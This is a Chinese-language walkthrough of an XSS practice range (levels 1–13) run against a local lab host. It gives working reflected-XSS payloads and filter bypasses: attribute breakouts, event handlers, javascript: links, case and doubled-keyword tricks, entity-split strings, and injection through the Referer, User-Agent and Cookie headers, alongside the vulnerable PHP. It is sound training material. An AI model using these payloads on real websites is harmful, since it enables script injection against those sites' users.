@[toc]
> 靶场在线地址 ： http://test.xss.tv
### 第一关

![image-20230826092337054](./imgs/1e0a54cd32b90594f5c62586c398dd69.png)

观察页面

```php
http://192.168.80.139/xsschallenge/level1.php?name=test
```

尝试在`name=`后面输入最近基本的xss语法

```js
<script>alert(1)</script>
```



![image-20230826092430528](./imgs/1f812f4e5e35fe6e6d4d565be5061666.png)

### 第二关

![image-20230826092527275](./imgs/cfe151b822e5c65e385b04a92aa92827.png)

查看页面源代码

![image-20230826092631554](./imgs/0be034b7f3efe383294576f29ed7ea69.png)

可以通过构造闭合

```js
"> <script>alert(1)</script>
```

![image-20230826092745587](./imgs/3619d2e5267d77b63d6e03761810eb6d.png)

### 第三关

![image-20230826092807791](./imgs/de00ed1fe24e6ceb2d85d260f981ea2d.png)

查看页面源代码

![image-20230826092840649](./imgs/8e98e1bb074a493b716841667e482006.png)

发现过滤了特殊字符

通过单引号闭合，使用触发事件来绕过

```js
' onclick='alert(/xss/)
```

![image-20230826093111014](./imgs/a07fcb8e3ff6ebf6b1fdffa6a1110da5.png)

### 第四关

![image-20230826093217934](./imgs/3b6368906c547b0a4f94bc80f32a6560.png)

过滤了`<  >`标签

可是试着尝试上一关的方法



```js
" onclick="alert(1)
```

![image-20230826093411768](./imgs/2f6fcd7d4bf42dd81b904830f650de8b.png)

### 第五关

![image-20230826093450544](./imgs/ed19bf5bf9ecf6b9aa1ec60ddee58e51.png)

通过查看源码得知，替换了`script`为`scr_ipt`

使用大写绕过，看看是否可行

```js
<SCRIPT>alert(10)</SCRIPT>
```

![image-20230826093607816](./imgs/d671934da9483cfb51fb9231f34058cf.png)

发现还是不行，后端把 我们输入的大写，替换成了小写

尝试其他方法绕过，使用伪协议

```js
"> <a href=javascript:alert(1)>demo</a>
```

![image-20230826093829811](./imgs/0d14bb018838566a71236b1d08d0812b.png)

### 第六关

输入`<script>alert(1)</script>`测试，查看源代码，依旧替换了script

![image-20230826093917830](./imgs/7d0abfb91bae102274ea6c7d62b6e568.png)

```js
"><Img sRc=# OnErRoR=alert(/xss/);>
```

![image-20230826094351798](./imgs/c657c84d1b634e56b391664f0f126788.png)

### 第七关

使用上一关的通过代码，发现把`on`给过滤掉 了，还把`href`给过滤了

![image-20230826094454508](./imgs/eb8970a166703300be1abc60fa777c2f.png)

我们可以尝试点击事件，双写`on`，来绕过

```js
" oonnclick=alert(1)//
```

![image-20230826094814182](./imgs/08d18a05d4c7a3727173a777aefc6ee4.png)

### 第八关

在页面输入框中输入`" onclick=alert(1)//`

查看页面源代码，发现双引号被做了转义，只能通过其他方式去绕过

![image-20230826094935553](./imgs/edfb429d2b75d5d8833445b453f73e7a.png)

可以↓方式去绕过

```js
j&#9;avasc&#10;r&#13;ipt:alert(/xss/)
```

![image-20230826095126535](./imgs/f3a95c92a4eb3ece2ff3a7855467c818.png)

### 第九关

```js
j&#9;avasc&#10;r&#13;ipt:alert('http://')
```

![image-20230826095231664](./imgs/0e5c09f8f6de1b57ab7558e0ef4b3d2a.png)

### 第十关

![image-20230826095259344](./imgs/d8aeccf025388759f3336e3587090211.png)

没有输入框可以在地址栏中绕过

```js
192.168.80.139/xsschallenge/level10.php?keyword=<script>alert(1)</script>
```

![image-20230826095343659](./imgs/1d0232e306d5e898566426fa1ecf85da.png)

页面没有反应，

查看页面源代码，发现三个隐藏起来的输入框

![image-20230826095435964](./imgs/2fd70c73a12bffa858b779661606818c.png)

![image-20230826095456884](./imgs/0c1b6760346713107b89ab5f6dd123b8.png)

可以尝试使用`t_link\t_history\t_sort`这三个 挨个尝试

发现只有 在`t_sort`输入的时候，才有变化

```js
http://192.168.80.139/xsschallenge/level10.php?t_sort=<script>alert(1)</script>
```

![image-20230826095734280](./imgs/7b724a91b53287b47a712c6262f2be61.png)

构造其他方法

```js
" type="test" onclick="alert(1)
```

![image-20230826095927057](./imgs/735e474d0aaa8c9eb047e4c71b4ed2b4.png)

### 第十一关

代码审计

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
```

查看页面代码

![image-20230826100644573](./imgs/fef2637d05016111540afc66a80ba29b.png)

发现`t_ref`的`value`值是第十关的 地址

```js
" type="button" onclick="alert(1)
```



![image-20230826100809931](./imgs/3904276e401978436b5130246fd92280.png)



也可以使用`bp`抓取数据包修改Referer字段的值

### 第十二关

代码审计

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
```

```js
" type="button" onmouseover="alert(1)"
```



![image-20230826101507977](./imgs/38612d48699031609fbf1dbbf7f4db53.png)



### 第十三关

代码审计

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
```

```php
user=" type="button" onmouseover="alert(1)"
```

![image-20230826101736586](./imgs/f21891e9524e3359599a0d34d1f214f7.png)